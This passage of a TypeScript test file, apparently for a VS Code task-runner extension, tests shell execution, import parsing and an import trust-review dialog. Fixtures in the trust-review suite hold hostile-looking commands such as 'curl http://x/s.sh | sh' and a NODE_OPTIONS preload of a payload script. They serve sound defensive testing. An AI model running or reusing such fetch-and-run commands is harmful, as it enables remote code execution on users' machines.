				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});
	});

	suite('createShellExecution', () => {
		test('should create native ProcessExecution for a directly-launchable Windows command', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });

				const options: vscode.ShellExecutionOptions = { cwd: 'C:\\' };
				const lookup = {
					env: { PATH: 'C:\\node' },
					isFile: (candidate: string) => candidate === 'C:\\node\\node.exe',
				};
				const result = createShellExecution(
					'node.exe', ['-e', 'process.stdout.write("hello")'], options, true, false, lookup
				);

				assert.ok(result.shellExecution instanceof vscode.ProcessExecution);
				assert.strictEqual((result.shellExecution as vscode.ProcessExecution).process, 'C:\\node\\node.exe');
				assert.ok(result.displayCommand.includes('process.stdout.write(\\"hello\\")'));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('비-raw Windows 명령은 주입된 PATH에서 확장자 없는 실행 파일을 찾는다', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });
				const checkedPaths: string[] = [];
				const result = createShellExecution(
					'node',
					['-e', 'process.stdout.write("hello")'],
					{ cwd: 'C:\\' },
					true,
					false,
					{
						env: { PATH: 'C:\\toolchain' },
						isFile: candidate => {
							checkedPaths.push(candidate);
							return candidate === 'C:\\toolchain\\node.exe';
						},
					}
				);

				assert.ok(result.shellExecution instanceof vscode.ProcessExecution);
				assert.ok(checkedPaths.includes('C:\\toolchain\\node.exe'));
				assert.strictEqual(
					(result.shellExecution as vscode.ProcessExecution).process,
					'C:\\toolchain\\node.exe'
				);
				assert.ok(result.displayCommand.startsWith('node '));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should keep Windows shell builtins on PowerShell execution', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });

				const options: vscode.ShellExecutionOptions = { cwd: 'C:\\' };
				const result = createShellExecution('echo', ['hello'], options, true);

				assert.ok(result.shellExecution instanceof vscode.ShellExecution);
				assert.ok(result.displayCommand.includes('echo'));
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('should create ShellExecution for POSIX', () => {
			const originalPlatform = process.platform;
			try {
				Object.defineProperty(process, 'platform', { value: 'darwin' });

				const options: vscode.ShellExecutionOptions = { cwd: '/tmp' };
				const result = createShellExecution('ls', ['-la'], options, false);

				assert.ok(result.shellExecution);
				assert.strictEqual(result.displayCommand, "ls '-la'");
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});
	});

	suite('filterConflictingItems', () => {
		test('should filter out items with conflicting IDs', () => {
			const existingIds = new Set(['action1', 'action2']);
			const items: ActionItem[] = [
				{ id: 'action1', title: 'Conflicting Action' },
				{ id: 'action3', title: 'Non-conflicting Action' }
			];

			const result = filterConflictingItems(items, existingIds);

			assert.strictEqual(result.length, 1);
			assert.strictEqual(result[0].id, 'action3');
		});

		test('should return all items when no conflicts', () => {
			const existingIds = new Set(['other1', 'other2']);
			const items: ActionItem[] = [
				{ id: 'action1', title: 'Action 1' },
				{ id: 'action2', title: 'Action 2' }
			];

			const result = filterConflictingItems(items, existingIds);

			assert.strictEqual(result.length, 2);
		});

		test('should return empty array when all items conflict', () => {
			const existingIds = new Set(['action1', 'action2']);
			const items: ActionItem[] = [
				{ id: 'action1', title: 'Action 1' },
				{ id: 'action2', title: 'Action 2' }
			];

			const result = filterConflictingItems(items, existingIds);

			assert.strictEqual(result.length, 0);
		});

		test('should recursively filter nested children with conflicting IDs', () => {
			const existingIds = new Set(['nested-conflict']);
			const items: ActionItem[] = [
				{
					id: 'folder1',
					title: 'Folder',
					type: 'folder',
					children: [
						{ id: 'nested-conflict', title: 'Conflicting Nested' },
						{ id: 'nested-ok', title: 'OK Nested' }
					]
				}
			];

			const result = filterConflictingItems(items, existingIds);

			assert.strictEqual(result.length, 1);
			assert.strictEqual(result[0].id, 'folder1');
			assert.strictEqual(result[0].children?.length, 1);
			assert.strictEqual(result[0].children?.[0].id, 'nested-ok');
		});

		test('should filter parent folder if its ID conflicts', () => {
			const existingIds = new Set(['folder1']);
			const items: ActionItem[] = [
				{
					id: 'folder1',
					title: 'Conflicting Folder',
					type: 'folder',
					children: [
						{ id: 'child1', title: 'Child 1' }
					]
				}
			];

			const result = filterConflictingItems(items, existingIds);

			assert.strictEqual(result.length, 0);
		});

		test('should not mutate original items', () => {
			const existingIds = new Set(['nested-conflict']);
			const originalChildren = [
				{ id: 'nested-conflict', title: 'Conflicting' },
				{ id: 'nested-ok', title: 'OK' }
			];
			const items: ActionItem[] = [
				{
					id: 'folder1',
					title: 'Folder',
					type: 'folder',
					children: [...originalChildren]
				}
			];

			filterConflictingItems(items, existingIds);

			// Original should be unchanged
			assert.strictEqual(items[0].children?.length, 2);
		});

		test('should handle empty items array', () => {
			const existingIds = new Set(['action1']);
			const result = filterConflictingItems([], existingIds);
			assert.strictEqual(result.length, 0);
		});

		test('should handle empty existingIds set', () => {
			const items: ActionItem[] = [
				{ id: 'action1', title: 'Action 1' },
				{ id: 'action2', title: 'Action 2' }
			];

			const result = filterConflictingItems(items, new Set());

			assert.strictEqual(result.length, 2);
		});
	});

	suite('findConflictingIds', () => {
		test('should find conflicting IDs between two action arrays', () => {
			const actions1: ActionItem[] = [
				{ id: 'action1', title: 'Action 1' },
				{ id: 'action2', title: 'Action 2' }
			];
			const actions2: ActionItem[] = [
				{ id: 'action2', title: 'Duplicate Action 2' },
				{ id: 'action3', title: 'Action 3' }
			];

			const conflicts = findConflictingIds(actions1, actions2);

			assert.strictEqual(conflicts.length, 1);
			assert.strictEqual(conflicts[0], 'action2');
		});

		test('should return empty array when no conflicts', () => {
			const actions1: ActionItem[] = [
				{ id: 'action1', title: 'Action 1' }
			];
			const actions2: ActionItem[] = [
				{ id: 'action2', title: 'Action 2' }
			];

			const conflicts = findConflictingIds(actions1, actions2);

			assert.strictEqual(conflicts.length, 0);
		});

		test('should find nested conflicting IDs', () => {
			const actions1: ActionItem[] = [
				{
					id: 'folder1',
					title: 'Folder',
					type: 'folder',
					children: [
						{ id: 'nested-action', title: 'Nested Action' }
					]
				}
			];
			const actions2: ActionItem[] = [
				{ id: 'nested-action', title: 'Conflicting Nested' }
			];

			const conflicts = findConflictingIds(actions1, actions2);

			assert.strictEqual(conflicts.length, 1);
			assert.strictEqual(conflicts[0], 'nested-action');
		});

		test('should find conflicts in nested children of second array', () => {
			const actions1: ActionItem[] = [
				{ id: 'action1', title: 'Action 1' }
			];
			const actions2: ActionItem[] = [
				{
					id: 'folder1',
					title: 'Folder',
					type: 'folder',
					children: [
						{ id: 'action1', title: 'Conflicting in child' }
					]
				}
			];

			const conflicts = findConflictingIds(actions1, actions2);

			assert.strictEqual(conflicts.length, 1);
			assert.strictEqual(conflicts[0], 'action1');
		});

		test('should handle multiple conflicts', () => {
			const actions1: ActionItem[] = [
				{ id: 'a', title: 'A' },
				{ id: 'b', title: 'B' },
				{ id: 'c', title: 'C' }
			];
			const actions2: ActionItem[] = [
				{ id: 'a', title: 'Conflict A' },
				{ id: 'b', title: 'Conflict B' },
				{ id: 'd', title: 'D' }
			];

			const conflicts = findConflictingIds(actions1, actions2);

			assert.strictEqual(conflicts.length, 2);
			assert.ok(conflicts.includes('a'));
			assert.ok(conflicts.includes('b'));
		});

		test('should handle empty arrays', () => {
			assert.strictEqual(findConflictingIds([], []).length, 0);
			assert.strictEqual(findConflictingIds([{ id: 'a', title: 'A' }], []).length, 0);
			assert.strictEqual(findConflictingIds([], [{ id: 'a', title: 'A' }]).length, 0);
		});
	});

	suite('debounce', () => {
		test('should call the function after the delay', (done) => {
			let callCount = 0;
			const debouncedFn = debounce(() => { callCount++; }, 30);
			debouncedFn.run();
			setTimeout(() => {
				assert.strictEqual(callCount, 1);
				done();
			}, 80);
		});

		test('should batch rapid successive calls into one', (done) => {
			let callCount = 0;
			const debouncedFn = debounce(() => { callCount++; }, 30);
			debouncedFn.run();
			debouncedFn.run();
			debouncedFn.run();
			setTimeout(() => {
				assert.strictEqual(callCount, 1);
				done();
			}, 80);
		});

		test('should fire again after the delay has elapsed', (done) => {
			let callCount = 0;
			const debouncedFn = debounce(() => { callCount++; }, 30);
			debouncedFn.run();
			setTimeout(() => {
				debouncedFn.run();
			}, 80);
			setTimeout(() => {
				assert.strictEqual(callCount, 2);
				done();
			}, 160);
		});

		test('cancel should prevent the pending timer from firing', (done) => {
			let callCount = 0;
			const debouncedFn = debounce(() => { callCount++; }, 60);
			debouncedFn.run();
			debouncedFn.cancel();
			setTimeout(() => {
				assert.strictEqual(callCount, 0, 'cancel should prevent the fn from being called');
				done();
			}, 120);
		});
	});

	suite('parsePathInfo', () => {
		test('should parse file path with extension', () => {
			const result = parsePathInfo('/projects/my-app/config.json');
			assert.strictEqual(result.path, '/projects/my-app/config.json');
			assert.strictEqual(result.dir, '/projects/my-app');
			assert.strictEqual(result.name, 'config.json');
			assert.strictEqual(result.fileNameOnly, 'config');
			assert.strictEqual(result.fileExt, 'json');
		});

		test('should parse folder path without extension', () => {
			const result = parsePathInfo('/projects/my-app');
			assert.strictEqual(result.path, '/projects/my-app');
			assert.strictEqual(result.dir, '/projects');
			assert.strictEqual(result.name, 'my-app');
			assert.strictEqual(result.fileNameOnly, 'my-app');
			assert.strictEqual(result.fileExt, '');
		});

		test('should parse folder path with dot in name', () => {
			const result = parsePathInfo('/projects/my.app');
			assert.strictEqual(result.name, 'my.app');
			assert.strictEqual(result.fileNameOnly, 'my');
			assert.strictEqual(result.fileExt, 'app');
		});

		test('should parse path with multiple dots', () => {
			const result = parsePathInfo('/projects/archive.tar.gz');
			assert.strictEqual(result.name, 'archive.tar.gz');
			assert.strictEqual(result.fileNameOnly, 'archive.tar');
			assert.strictEqual(result.fileExt, 'gz');
		});

		test('should handle dotfile (hidden file/folder)', () => {
			const result = parsePathInfo('/projects/.config');
			assert.strictEqual(result.name, '.config');
			assert.strictEqual(result.fileNameOnly, '.config');
			assert.strictEqual(result.fileExt, '');
		});
	});

	suite('handleConfirm', () => {
		test('should throw when user cancels (selects nothing)', async () => {
			// showWarningMessage returns undefined when dismissed
			const originalShowWarningMessage = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => undefined;
			try {
				await assert.rejects(
					() => handleConfirm({ message: 'Continue?', confirmLabel: 'Yes', cancelLabel: 'No' }),
					// 문구가 아니라 `name` 으로 분류한다 — 메시지는 이제 지역화되고,
					// 파이프라인도 이 이름으로 '취소'와 '실패'를 가른다.
					(e: unknown) => e instanceof Error && e.name === 'PromptCancelledError'
				);
			} finally {
				(vscode.window as any).showWarningMessage = originalShowWarningMessage;
			}
		});

		test('should throw when user selects cancel label', async () => {
			const originalShowWarningMessage = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => 'No';
			try {
				await assert.rejects(
					() => handleConfirm({ message: 'Continue?', confirmLabel: 'Yes', cancelLabel: 'No' }),
					// 문구가 아니라 `name` 으로 분류한다 — 메시지는 이제 지역화되고,
					// 파이프라인도 이 이름으로 '취소'와 '실패'를 가른다.
					(e: unknown) => e instanceof Error && e.name === 'PromptCancelledError'
				);
			} finally {
				(vscode.window as any).showWarningMessage = originalShowWarningMessage;
			}
		});

		test('should return confirmed true when user confirms', async () => {
			const originalShowWarningMessage = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => 'Yes';
			try {
				const result = await handleConfirm({ message: 'Continue?', confirmLabel: 'Yes', cancelLabel: 'No' });
				assert.strictEqual(result.confirmed, 'true');
			} finally {
				(vscode.window as any).showWarningMessage = originalShowWarningMessage;
			}
		});

		test('should use default labels when not specified', async () => {
			const originalShowWarningMessage = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => 'Yes';
			try {
				const result = await handleConfirm({});
				assert.strictEqual(result.confirmed, 'true');
			} finally {
				(vscode.window as any).showWarningMessage = originalShowWarningMessage;
			}
		});

		test('should use custom confirm label', async () => {
			const originalShowWarningMessage = vscode.window.showWarningMessage;
			let capturedArgs: any[] = [];
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				capturedArgs = args;
				return 'Proceed';
			};
			try {
				const result = await handleConfirm({ message: 'Deploy?', confirmLabel: 'Proceed', cancelLabel: 'Abort' });
				assert.strictEqual(result.confirmed, 'true');
				assert.strictEqual(capturedArgs[0], 'Deploy?');
				assert.strictEqual(capturedArgs[2], 'Proceed');
				assert.strictEqual(capturedArgs[3], 'Abort');
			} finally {
				(vscode.window as any).showWarningMessage = originalShowWarningMessage;
			}
		});
	});

	suite('serializeExportData', () => {
		test('should create valid export format', () => {
			const actions: ActionItem[] = [
				{ id: 'test.action', title: 'Test', action: { description: 'desc', tasks: [{ id: 't1', type: 'shell', command: 'echo hi' }] } }
			];
			const result = JSON.parse(serializeExportData(actions));
			assert.strictEqual(result.version, 1);
			assert.ok(result.exportedAt);
			assert.strictEqual(result.actions.length, 1);
			assert.strictEqual(result.actions[0].id, 'test.action');
		});

		test('should handle empty actions array', () => {
			const result = JSON.parse(serializeExportData([]));
			assert.strictEqual(result.version, 1);
			assert.strictEqual(result.actions.length, 0);
		});
	});

	suite('parseImportData', () => {
		test('should parse TaskHub export format', () => {
			const data = JSON.stringify({
				version: 1,
				exportedAt: '2026-01-01T00:00:00.000Z',
				actions: [{ id: 'test.action', title: 'Test', action: { description: 'desc', tasks: [{ id: 't1', type: 'shell' }] } }]
			});
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(errors.length, 0);
			assert.strictEqual(actions.length, 1);
			assert.strictEqual(actions[0].id, 'test.action');
		});

		test('should parse raw actions.json array', () => {
			const data = JSON.stringify([
				{ id: 'raw.action', title: 'Raw', action: { description: 'desc', tasks: [{ id: 't1', type: 'shell' }] } }
			]);
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(errors.length, 0);
			assert.strictEqual(actions.length, 1);
		});

		test('should return error for invalid JSON', () => {
			const { actions, errors } = parseImportData('not json');
			assert.strictEqual(actions.length, 0);
			assert.strictEqual(errors.length, 1);
			assert.ok(errors[0].includes('Invalid JSON'));
		});

		test('should return error for unsupported version', () => {
			const data = JSON.stringify({ version: 99, actions: [] });
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(actions.length, 0);
			assert.ok(errors[0].includes('Unsupported export version'));
		});

		test('should return error for invalid structure', () => {
			const data = JSON.stringify({ foo: 'bar' });
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(actions.length, 0);
			assert.strictEqual(errors.length, 1);
		});

		test('should return schema validation error for malformed actions', () => {
			const data = JSON.stringify([{ notAnAction: true }]);
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(actions.length, 0);
			assert.ok(errors.length > 0);
			assert.ok(errors[0].includes('Schema validation failed'));
		});

		test('should return error for duplicate action IDs within imported file', () => {
			const data = JSON.stringify([
				{ id: 'dup.action', title: 'First', action: { description: 'desc', tasks: [{ id: 't1', type: 'shell' }] } },
				{ id: 'dup.action', title: 'Second', action: { description: 'desc', tasks: [{ id: 't2', type: 'shell' }] } }
			]);
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(actions.length, 0);
			assert.strictEqual(errors.length, 1);
			assert.ok(errors[0].includes('Duplicate action id'));
			assert.ok(errors[0].includes('dup.action'));
		});

		test('should return error for duplicate IDs in nested children of imported file', () => {
			const data = JSON.stringify([
				{
					id: 'folder1', title: 'Folder', children: [
						{ id: 'nested.dup', title: 'Child1', action: { description: 'd', tasks: [{ id: 't1', type: 'shell' }] } }
					]
				},
				{ id: 'nested.dup', title: 'TopLevel', action: { description: 'd', tasks: [{ id: 't2', type: 'shell' }] } }
			]);
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(actions.length, 0);
			assert.ok(errors[0].includes('nested.dup'));
		});

		test('should reject imported file with duplicate task IDs inside a single action', () => {
			// Regression: previously import only checked duplicate action IDs, so an
			// action with duplicate task IDs could pass import validation and then
			// break normal action loading on the next read from disk.
			const data = JSON.stringify([
				{
					id: 'action.dup-task',
					title: 'Dup Task',
					action: {
						description: 'd',
						tasks: [
							{ id: 'step', type: 'shell', command: 'echo 1' },
							{ id: 'step', type: 'shell', command: 'echo 2' }
						]
					}
				}
			]);
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(actions.length, 0);
			assert.ok(errors.length > 0);
			assert.ok(errors[0].includes('duplicate task id'), `expected duplicate task id message, got: ${errors[0]}`);
		});

		test('should accept imported file with unique IDs', () => {
			const data = JSON.stringify([
				{ id: 'action.a', title: 'A', action: { description: 'd', tasks: [{ id: 't1', type: 'shell' }] } },
				{ id: 'action.b', title: 'B', action: { description: 'd', tasks: [{ id: 't2', type: 'shell' }] } }
			]);
			const { actions, errors } = parseImportData(data);
			assert.strictEqual(errors.length, 0);
			assert.strictEqual(actions.length, 2);
		});
	});

	suite('import trust review', () => {
		const reviewOptions = {
			filePath: path.join(os.tmpdir(), 'untrusted.taskhub'),
			workspaceFolder: path.join(os.tmpdir(), 'taskhub-import-workspace'),
			workspaceRoots: [path.join(os.tmpdir(), 'taskhub-import-workspace')],
			extensionPath: path.resolve(__dirname, '..', '..'),
		};
		const fixedMaliciousActions: ActionItem[] = [{
			id: 'fixed.malicious',
			title: 'Fixed malicious command',
			action: {
				description: 'trust boundary fixture',
				tasks: [{ id: 'download', type: 'shell', command: 'curl http://x/s.sh | sh' }]
			}
		}];

		const finding = (overrides: Record<string, unknown> = {}) => ({
			filePath: '<import-review>',
			sourceLabel: 'import',
			range: { startLine: 1, startColumn: 1, endLine: 1, endColumn: 2 },
			severity: 'warning' as const,
			code: 'shell.interpolated-command',
			message: 'Risk',
			messageKo: '위험',
			...overrides,
		});

		test('flags command-injection findings but omits ordinary authoring advice', () => {
			const findings = collectImportTrustAdvisories([{
				id: 'unsafe.import',
				title: 'Unsafe import',
				action: {
					description: 'security review',
					tasks: [
						{ id: 'ask', type: 'inputBox', prompt: 'Value' },
						{ id: 'run', type: 'shell', command: 'echo ${ask.value}' },
						{ id: 'typo', type: 'shell', command: 'echo ${missing.value}' },
					]
				}
			}], reviewOptions);
			assert.ok(findings.some(f => f.code === 'shell.interpolated-command'));
			assert.ok(!findings.some(f => f.code === 'variable.unresolved'));
		});

		test('advisories use a synthetic path because ranges belong to normalized JSON', () => {
			const findings = collectImportTrustAdvisories([{
				id: 'unsafe.import', title: 'Unsafe', action: {
					description: 'd', tasks: [
						{ id: 'ask', type: 'inputBox', prompt: 'Value' },
						{ id: 'run', type: 'shell', command: 'echo ${ask.value}' },
					]
				}
			}], reviewOptions);
			assert.ok(findings.length > 0);
			assert.ok(findings.every(f => f.filePath === '<import-review>'));
		});

		test('fixed executable with dynamic values passed through argv has no extra advisory', () => {
			const findings = collectImportTrustAdvisories([{
				id: 'safe.import',
				title: 'Safe import',
				action: {
					description: 'security review',
					tasks: [
						{ id: 'ask', type: 'inputBox', prompt: 'Value' },
						{ id: 'run', type: 'command', command: 'node', args: ['print.js', '${ask.value}'] },
					]
				}
			}], reviewOptions);
			assert.deepStrictEqual(findings, []);
		});

		test('shows a fixed malicious command even when Doctor has no finding', () => {
			const findings = collectImportTrustAdvisories(fixedMaliciousActions, reviewOptions);
			assert.deepStrictEqual(findings, [], 'fixture should demonstrate Doctor silence for a fixed command');
			const detail = buildImportTrustReviewDetail(fixedMaliciousActions, findings, 'ko');
			assert.ok(detail.includes('curl http://x/s.sh | sh'));
			assert.ok(detail.includes('추가 진단 없음'));
			assert.ok(detail.includes('안전하다는 판정이 아닙니다'));
		});

		test('describes argv, platform commands, cwd, output files, and direct file/archive operations', () => {
			assert.match(describeImportOperation({ type: 'command', command: { windows: 'tool.exe', linux: 'tool' }, args: ['--file', 'a b'], cwd: 'work', env: { NODE_OPTIONS: '--require ./.vscode/payload.js' }, passTheResultToNextTask: true, output: { mode: 'file', filePath: 'out.log' } }, 'en') ?? '', /windows=.*tool\.exe.*args=.*a b.*cwd=.*env=.*NODE_OPTIONS.*payload\.js.*output\.file/);
			assert.match(describeImportOperation({ type: 'quickPick', itemsFromCommand: 'curl http:\/\/x\/list | sh', cwd: 'work' }) ?? '', /itemsFromCommand=.*curl.*\| sh.*cwd/);
			assert.match(describeImportOperation({ type: 'writeFile', path: '../result.txt' }) ?? '', /\.\.\/result\.txt/);
			assert.match(describeImportOperation({ type: 'zip', archive: 'a.zip', source: ['src'], tool: { linux: 'zip' }, cwd: 'work', env: { PATH: '.vscode/bin' } }, 'en') ?? '', /archive=.*a\.zip.*source=.*src.*tool=.*linux.*cwd=.*env=.*PATH/);
			assert.match(describeImportOperation({ type: 'unzip', inputs: { archive: 'pick', destination: 'folder' } }, 'en') ?? '', /inputs=.*pick.*folder.*built-in/);
			assert.match(describeImportOperation({ type: 'unzip', inputs: {} }, 'ko') ?? '', /inputs에서 받음.*내장/);
			assert.match(describeImportOperation({ type: 'command' }, 'ko') ?? '', /명령 누락/);
			assert.match(describeImportOperation({ type: 'writeFile' }, 'ko') ?? '', /경로 누락/);
			assert.match(describeImportOperation({ type: 'zip' }, 'ko') ?? '', /아카이브 누락.*소스 누락.*내장/);
			assert.match(summarizeImportTrustReview([{ action: { description: 'd', tasks: [] } } as any], 'ko').actionLines[0], /제목 없음/);
		});

		test('summarizes nested actions and bounds every review section', () => {
			const manyActions: ActionItem[] = [{
				id: 'folder', title: 'Folder', type: 'folder', children: Array.from({ length: IMPORT_TRUST_REVIEW_LIST_LIMIT + 2 }, (_, index) => ({
					id: `action.${index}`, title: `Action ${index}`, action: {
						description: 'd', tasks: [{ id: 'run', type: 'shell' as const, command: `echo ${index}` }]
					}
				}))
			}];
			const findings = Array.from({ length: IMPORT_TRUST_REVIEW_LIST_LIMIT + 2 }, (_, index) => finding({ message: `Risk ${index + 1}`, messageKo: `위험 ${index + 1}` }));
			const summary = summarizeImportTrustReview(manyActions);
			assert.strictEqual(summary.actionCount, IMPORT_TRUST_REVIEW_LIST_LIMIT + 2);
			assert.strictEqual(summary.taskCount, IMPORT_TRUST_REVIEW_LIST_LIMIT + 2);
			const detail = buildImportTrustReviewDetail(manyActions, findings, 'ko');
			assert.ok(detail.includes(`경고 ${findings.length}건`));
			assert.ok(detail.includes('… 외 2개'));
			assert.ok(!detail.includes(`위험 ${findings.length}`));
			const infoDetail = buildImportTrustReviewDetail(manyActions, [finding({ severity: 'info' }) as any], 'ko');
			assert.ok(infoDetail.includes('정보 1건'));
		});

		test('always prompts even with zero findings; dismissal cancels the import', async () => {
			const original = vscode.window.showWarningMessage;
			let captured: any[] | undefined;
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				captured = args;
				return undefined;
			};
			try {
				const allowed = await confirmImportTrustReview(reviewOptions.filePath, fixedMaliciousActions, []);
				assert.strictEqual(allowed, false);
				assert.strictEqual(captured?.[1]?.modal, true);
				assert.ok(typeof captured?.[1]?.detail === 'string');
				assert.match(captured?.[2]?.title ?? '', /검토|Review/);
				assert.match(captured?.[3]?.title ?? '', /위험|risk/i);
				assert.strictEqual(captured?.[4]?.isCloseAffordance, true);
				assert.strictEqual(captured?.filter(item => item?.title && /취소|Cancel/.test(item.title)).length, 1);
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('continues only when the explicit secondary import item is selected', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async (_message: string, _options: any, _inspectItem: any, continueItem: any) => continueItem;
			try {
				const allowed = await confirmImportTrustReview(reviewOptions.filePath, fixedMaliciousActions, []);
				assert.strictEqual(allowed, true);
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('the default Review action opens the source, then requires a second explicit import choice', async () => {
			const originalWarning = vscode.window.showWarningMessage;
			const originalShowTextDocument = vscode.window.showTextDocument;
			let call = 0;
			let openedPath: string | undefined;
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				call++;
				return call === 1 ? args[2] : args[1];
			};
			(vscode.window as any).showTextDocument = async (uri: vscode.Uri) => {
				openedPath = uri.fsPath;
				return {};
			};
			try {
				const allowed = await confirmImportTrustReview(reviewOptions.filePath, fixedMaliciousActions, []);
				assert.strictEqual(allowed, true);
				const normalizePath = (value: string | undefined) => process.platform === 'win32'
					? value?.replace(/^([a-z]):\\/, (_match, drive: string) => `${drive.toUpperCase()}:\\`)
					: value;
				assert.strictEqual(normalizePath(openedPath), normalizePath(reviewOptions.filePath));
				assert.strictEqual(call, 2);
			} finally {
				(vscode.window as any).showWarningMessage = originalWarning;
				(vscode.window as any).showTextDocument = originalShowTextDocument;
			}
		});

		test('cancels if the source changed after it was parsed and selected for import', async () => {
			const original = vscode.window.showWarningMessage;
			const sourcePath = path.join(os.tmpdir(), `taskhub-import-race-${Date.now()}.taskhub`);
			fs.writeFileSync(sourcePath, 'old content');
			let call = 0;
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				call++;
				return call === 1 ? args[3] : undefined;
			};
			try {
				fs.writeFileSync(sourcePath, 'changed content');
				const allowed = await confirmImportTrustReview(sourcePath, fixedMaliciousActions, [], 'old content');
				assert.strictEqual(allowed, false);
				assert.strictEqual(call, 2, 'the second warning should explain that the source changed');
			} finally {
				(vscode.window as any).showWarningMessage = original;
				try { fs.unlinkSync(sourcePath); } catch { /* best effort */ }
			}
		});

		test('backup modal also has Review as default and exactly one close affordance', async () => {
			const original = vscode.window.showWarningMessage;
			let captured: any[] | undefined;
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				captured = args;
				return undefined;
			};
			try {
				const resolution = await confirmImportInvalidActionsBackup('/tmp/actions.json', '/tmp/actions.json.bak', 'bad json', '{ bad');
				assert.strictEqual(resolution.kind, 'cancel');
				assert.match(captured?.[2]?.title ?? '', /검토|Review/);
				assert.match(captured?.[3]?.title ?? '', /백업|Back up/);
				assert.strictEqual(captured?.[4]?.isCloseAffordance, true);
				assert.strictEqual(captured?.filter(item => item?.isCloseAffordance).length, 1);
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('revalidates an actions.json repaired during Review and merges it without a backup', async () => {
			const originalWarning = vscode.window.showWarningMessage;
			const originalInfo = vscode.window.showInformationMessage;
			const originalShowTextDocument = vscode.window.showTextDocument;
			const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'taskhub-import-repair-'));
			const actionsPath = path.join(directory, 'actions.json');
			const oldContent = '{ bad';
			const repairedContent = JSON.stringify([{
				id: 'repaired', title: 'Repaired', action: {
					description: 'valid after review', tasks: [{ id: 'run', type: 'command', command: 'node', args: ['--version'] }]
				}
			}], null, 2);
			fs.writeFileSync(actionsPath, oldContent);
			let warningCall = 0;
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				warningCall++;
				return warningCall === 1 ? args[2] : args[1];
			};
			(vscode.window as any).showTextDocument = async () => {
				fs.writeFileSync(actionsPath, repairedContent);
				return {};
			};
			(vscode.window as any).showInformationMessage = async () => undefined;
			try {
				const resolution = await confirmImportInvalidActionsBackup(
					actionsPath,
					`${actionsPath}.bak`,
					'bad json',
					oldContent
				);
				assert.strictEqual(resolution.kind, 'merge');
				if (resolution.kind === 'merge') {
					assert.strictEqual(resolution.actions[0].id, 'repaired');
					assert.strictEqual(resolution.content, repairedContent);
				}
			} finally {
				(vscode.window as any).showWarningMessage = originalWarning;
				(vscode.window as any).showInformationMessage = originalInfo;
				(vscode.window as any).showTextDocument = originalShowTextDocument;
				fs.rmSync(directory, { recursive: true, force: true });
			}
		});

		test('backs up the latest bytes when an edit made during Review is still invalid', async () => {
			const originalWarning = vscode.window.showWarningMessage;
			const originalShowTextDocument = vscode.window.showTextDocument;
			const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'taskhub-import-still-invalid-'));
			const actionsPath = path.join(directory, 'actions.json');
			const oldContent = '{ old invalid';
			const latestContent = '{ latest invalid';
			fs.writeFileSync(actionsPath, oldContent);
			let warningCall = 0;
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				warningCall++;
				return warningCall === 1 ? args[2] : args[1];
			};
			(vscode.window as any).showTextDocument = async () => {
				fs.writeFileSync(actionsPath, latestContent);
				return {};
			};
			try {
				const resolution = await confirmImportInvalidActionsBackup(
					actionsPath,
					`${actionsPath}.bak`,
					'bad json',
					oldContent
				);
				assert.deepStrictEqual(resolution, { kind: 'backup', content: latestContent });
			} finally {
				(vscode.window as any).showWarningMessage = originalWarning;
				(vscode.window as any).showTextDocument = originalShowTextDocument;
				fs.rmSync(directory, { recursive: true, force: true });
			}
		});
	});

	suite('countActionItems', () => {
		test('should return 1 for a single action without children', () => {
			const item: ActionItem = { id: 'single', title: 'Single Action' };
			assert.strictEqual(countActionItems(item), 1);
		});

		test('should count children in a folder', () => {
			const item: ActionItem = {
				id: 'folder', title: 'Folder', type: 'folder',
				children: [
					{ id: 'child1', title: 'Child 1' },
					{ id: 'child2', title: 'Child 2' },
					{ id: 'child3', title: 'Child 3' }
				]
			};
			assert.strictEqual(countActionItems(item), 3);
		});

		test('should count nested children recursively', () => {
			const item: ActionItem = {
				id: 'root', title: 'Root', type: 'folder',
				children: [
					{ id: 'child1', title: 'Child 1' },
					{
						id: 'subfolder', title: 'Sub', type: 'folder',
						children: [
							{ id: 'nested1', title: 'Nested 1' },
							{ id: 'nested2', title: 'Nested 2' }
						]
					}
				]
			};
			assert.strictEqual(countActionItems(item), 3);
		});

		test('should return 0 for folder with empty children', () => {
			const item: ActionItem = { id: 'empty', title: 'Empty Folder', type: 'folder', children: [] };
			assert.strictEqual(countActionItems(item), 0);
		});
	});

	suite('mergeImportedActions', () => {
		test('should merge non-conflicting actions', () => {
			const existing: ActionItem[] = [{ id: 'existing.1', title: 'Existing' }];
			const imported: ActionItem[] = [{ id: 'imported.1', title: 'Imported' }];
